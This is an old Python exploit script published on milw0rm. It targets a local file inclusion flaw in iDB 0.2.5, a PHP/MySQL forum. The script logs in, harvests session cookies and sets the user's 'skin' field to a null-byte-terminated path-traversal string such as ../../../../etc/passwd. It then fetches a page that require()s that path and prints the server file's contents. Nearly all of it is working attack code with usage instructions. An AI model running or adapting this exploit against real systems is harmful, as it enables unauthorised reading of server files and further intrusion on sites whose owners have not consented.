#!/usr/bin/env
# LOTFREE 2009 - lotfree.next-touch.com
# Local require() vulnerability in iDB (a PHP/MySQL BBS)
# Test on version 0.2.5 Pre-Alpha SVN 243 (released March 30, 2009)
#
# No checks are made on var "skin" in inc/profilemain.php before saving it to database
# this value is then require()d in mysql.php as $_GET['theme'] (global var is overwritten) :
#=> require($SettDir['themes'].$_GET['theme']."/settings.php");
# so if we set "skin" to (for example) "../../../../../etc/passwd\0" we can get the passwd
# file content :)
# skin is saved to mysql as "UseTheme" in table idb_members
# !! the type is "varchar(26)" so we are limited in injection :( !!
#
# Website of iDB : http://idb.berlios.de/ - http://sourceforge.net/projects/freshmeat_idb/
import urllib, urllib2, sys

print "\tLOTFREE - iDB local PHP file inclusion vulnerability exploit\n"
if len(sys.argv)!=5:
  print "Usage: python LOTF-iDB.py <forum_root> <local_path_for_inclusion> <login> <password>"
  print "e.g: python LOTF-iDB.py http://localhost/iDB/ ../../../../etc/passwd johndoe s3cr3t"
  print "use python LOTF-iDB.py <forum_root> iDB <login> <password> to restore the default skin"
  sys.exit()

forum_root = sys.argv[1]
if forum_root[-1]!="/":
  forum_root += "/"
username = sys.argv[3]
password = sys.argv[4]
skin = ""
if sys.argv[2]=="iDB":
  skin = "iDB"
else:
  skin = sys.argv[2]+"\0"
if len(skin)>26:
  print "Path for inclusion must be lower than 27 chars in length due to SQL structure :("
  sys.exit()

print "Logging on the server..."
qs = {"username":username, "userpass": password, "storecookie": "true", "act": "loginmember"}
req = urllib2.Request(forum_root+"member.php?act=login_now",urllib.urlencode(qs))
data = urllib2.urlopen(req)
cookies = data.headers.getheaders("set-cookie")
cook = []
for c in cookies:
  for t in c.split(";"):
    if t.find("=")>0:
      k = t.split("=")[0]
      v = t.split("=",1)[1]
      if k in ["idb_sess", "MemberName", "UserID", "SessPass"]:
        cook.append(k+"="+v)
cook_str = "; ".join(cook)
print "Cookie string:",cook_str
print


qs = {"YourOffSet" : "0",
    "MinOffSet" : "00",
    "skin" : skin,
    "RepliesPerPage" : "10",
    "TopicsPerPage" : "10",
    "MessagesPerPage" : "10",
    "DST" : "off",
    "act" : "settings",
    "update" : "now"}
c_headers = {"Cookie": cook_str, "Referer": forum_root+"profile.php?act=settings"}
print "Sending payload..."
req = urllib2.Request(forum_root+"profile.php?act=settings",urllib.urlencode(qs),c_headers)
urllib2.urlopen(req)

req = urllib2.Request(forum_root+"index.php?act=view",headers=c_headers)
data = urllib2.urlopen(req).read()
# if /etc/passwd was included
if data.find("root:x:0:0:")>=0:
  print data.split("<")[0]
elif skin=="iDB":
  print "Default skin restored!"
elif data.find("require")>=0:
  print "Oups... file not found or access forbidden :(\n"
  print data[:200]
else:
  print "Output:"
  print data

# milw0rm.com [2009-04-06]